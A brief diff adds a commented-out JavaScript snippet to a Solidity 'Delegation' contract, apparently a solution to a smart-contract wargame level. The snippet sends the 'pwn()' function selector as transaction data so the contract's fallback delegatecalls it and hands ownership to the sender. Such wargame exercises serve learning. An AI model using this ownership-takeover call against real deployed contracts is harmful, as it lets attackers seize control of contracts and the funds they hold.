@@ -31,3 +31,8 @@ contract Delegation {
     }
   }
 }
+
+/*
+var pwned = web3.utils.keccak256("pwn()")
+await contract.sendTransaction({data: pwned})
+*/
